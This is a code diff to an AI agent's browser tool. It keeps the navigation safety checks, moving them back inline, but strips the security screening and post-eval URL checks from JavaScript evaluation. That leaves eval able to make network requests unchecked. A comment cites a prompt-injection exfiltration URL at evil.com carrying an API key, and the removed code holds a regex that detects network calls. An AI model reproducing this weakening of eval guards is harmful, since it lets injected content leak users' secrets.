@@ -99,128 +99,6 @@ except ImportError:
 
 logger = logging.getLogger(__name__)
 
-_BROWSER_EVAL_URL_RE = re.compile(r"https?://[^\s\'\"<>`)]+", re.IGNORECASE)
-_BROWSER_EVAL_NAV_OR_NETWORK_RE = re.compile(
-    r"\b(?:fetch|XMLHttpRequest|WebSocket|EventSource|Worker|SharedWorker|importScripts)\b"
-    r"|\bsendBeacon\b"
-    r"|\bwindow\s*\.\s*open\b"
-    r"|\blocation\s*="
-    r"|\blocation\s*\.\s*(?:assign|replace|reload)\s*\("
-    r"|\b(?:href|src|action)\s*="
-    r"|\.\s*submit\s*\("
-    r"|\.\s*setAttribute\s*\(\s*['\"](?:href|src|action)['\"]",
-    re.IGNORECASE,
-)
-
-
-def _browser_url_security_block(url: str, *, auto_local_this_nav: bool = False) -> Optional[Dict[str, Any]]:
-    """Return a browser policy block response for a URL, or None when allowed."""
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-
-    url_decoded = urllib.parse.unquote(url)
-    if (
-        _PREFIX_RE.search(url)
-        or _PREFIX_RE.search(url_decoded)
-    ):
-        return {
-            "success": False,
-            "error": (
-                "Blocked: URL contains what appears to be an API key or token. "
-                "Secrets must not be sent in URLs."
-            ),
-        }
-
-    if not _is_local_backend() and _is_always_blocked_url(url):
-        return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
-
-    if _is_camofox_mode():
-        if _is_always_blocked_url(url):
-            return {"success": False, "error": "Blocked: URL targets a cloud metadata endpoint"}
-        if not _is_safe_url(url):
-            return {"success": False, "error": "Blocked: URL targets a private or internal address"}
-
-    if (
-        not _is_local_backend()
-        and
-        not auto_local_this_nav
-        and not _allow_private_urls()
-        and not _is_safe_url(url)
-    ):
-        return {"success": False, "error": "Blocked: URL targets a private or internal address"}
-
-    blocked = check_website_access(url)
-    if blocked:
-        return {
-            "success": False,
-            "error": blocked["message"],
-            "blocked_by_policy": {
-                "host": blocked["host"],
-                "rule": blocked["rule"],
-                "source": blocked["source"],
-            },
-        }
-
-    return None
-
-
-def _browser_url_security_error(url: str, *, auto_local_this_nav: bool = False) -> Optional[str]:
-    """Return a browser policy error for a URL, or None when it is allowed."""
-    block = _browser_url_security_block(url, auto_local_this_nav=auto_local_this_nav)
-    return str(block["error"]) if block else None
-
-
-def _browser_eval_security_error(expression: str) -> Optional[str]:
-    """Return a policy error when a browser eval expression is unsafe."""
-    import urllib.parse
-    from agent.redact import _PREFIX_RE
-
-    expression_decoded = urllib.parse.unquote(expression)
-    if _PREFIX_RE.search(expression) or _PREFIX_RE.search(expression_decoded):
-        return (
-            "Blocked: URL contains what appears to be an API key or token. "
-            "Secrets must not be sent in URLs."
-        )
-
-    for url in _BROWSER_EVAL_URL_RE.findall(expression):
-        error = _browser_url_security_error(url.rstrip(".,;"))
-        if error:
-            return error
-
-    if not _is_local_backend() and _BROWSER_EVAL_NAV_OR_NETWORK_RE.search(expression):
-        return (
-            "Blocked: browser JavaScript evaluation cannot perform navigation "
-            "or network requests in cloud browser sessions. Use browser_navigate "
-            "for navigation so URL safety checks are enforced."
-        )
-
-    return None
-
-
-def _browser_eval_final_url_error(effective_task_id: str) -> Optional[str]:
-    """Validate the browser's current URL after eval-triggered side effects."""
-    if _is_local_backend():
-        return None
-
-    result = _run_browser_command(effective_task_id, "eval", ["location.href"], timeout=10)
-    if not result.get("success"):
-        return None
-
-    current_url = str(result.get("data", {}).get("result") or "").strip()
-    if not current_url.lower().startswith(("http://", "https://")):
-        return None
-
-    return _browser_url_security_error(current_url)
-
-
-def _blank_browser_after_block(effective_task_id: str) -> None:
-    """Best-effort blanking after an unsafe eval side effect is detected."""
-    try:
-        _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
-    except Exception:
-        logger.debug("Failed to blank browser after unsafe eval side effect", exc_info=True)
-
-
 # Standard PATH entries for environments with minimal PATH (e.g. systemd services).
 # Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
 # npx, node, and Android's glibc runner (grun).
@@ -2281,6 +2159,16 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
+    import urllib.parse
+    from agent.redact import _PREFIX_RE
+    url_decoded = urllib.parse.unquote(url)
+    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL contains what appears to be an API key or token. "
+                     "Secrets must not be sent in URLs.",
+        })
 
     # SSRF protection — block private/internal addresses before navigating.
     # Local browser backends still enforce this guard by default because
@@ -2301,9 +2189,43 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # 169.254.169.254 / metadata.google.internal / ECS task metadata
     # via a browser, and routing those to a local Chromium sidecar
     # on an EC2/GCP/Azure host exfiltrates IAM credentials (#16234).
-    block = _browser_url_security_block(url, auto_local_this_nav=auto_local_this_nav)
-    if block:
-        return json.dumps(block)
+    if not _is_local_backend() and _is_always_blocked_url(url):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL targets a cloud metadata endpoint",
+        })
+
+    if _is_camofox_mode():
+        if _is_always_blocked_url(url):
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: URL targets a cloud metadata endpoint",
+            })
+        if not _is_safe_url(url):
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: URL targets a private or internal address",
+            })
+
+    if (
+        not _is_local_backend()
+        and not auto_local_this_nav
+        and not _allow_private_urls()
+        and not _is_safe_url(url)
+    ):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL targets a private or internal address",
+        })
+
+    # Website policy check — block before navigating
+    blocked = check_website_access(url)
+    if blocked:
+        return json.dumps({
+            "success": False,
+            "error": blocked["message"],
+            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
+        })
 
     # Camofox backend — delegate after safety checks pass
     if _is_camofox_mode():
@@ -2762,10 +2684,6 @@ def browser_console(clear: bool = False, expression: Optional[str] = None, task_
 
 def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate a JavaScript expression in the page context and return the result."""
-    error = _browser_eval_security_error(expression)
-    if error:
-        return json.dumps({"success": False, "error": error}, ensure_ascii=False)
-
     if _is_camofox_mode():
         return _camofox_eval(expression, task_id)
 
@@ -2792,10 +2710,6 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
                         parsed = json.loads(raw_result)
                     except (json.JSONDecodeError, ValueError):
                         pass  # keep as string
-                post_error = _browser_eval_final_url_error(effective_task_id)
-                if post_error:
-                    _blank_browser_after_block(effective_task_id)
-                    return json.dumps({"success": False, "error": post_error}, ensure_ascii=False)
                 response = {
                     "success": True,
                     "result": parsed,
@@ -2850,11 +2764,6 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
         except (json.JSONDecodeError, ValueError):
             pass  # keep as string
 
-    post_error = _browser_eval_final_url_error(effective_task_id)
-    if post_error:
-        _blank_browser_after_block(effective_task_id)
-        return json.dumps(_copy_fallback_warning({"success": False, "error": post_error}, result), ensure_ascii=False)
-
     response = {
         "success": True,
         "result": parsed,
@@ -2865,10 +2774,6 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
-    error = _browser_eval_security_error(expression)
-    if error:
-        return json.dumps({"success": False, "error": error}, ensure_ascii=False)
-
     from tools.browser_camofox import _ensure_tab, _post
     try:
         tab_info = _ensure_tab(task_id or "default")
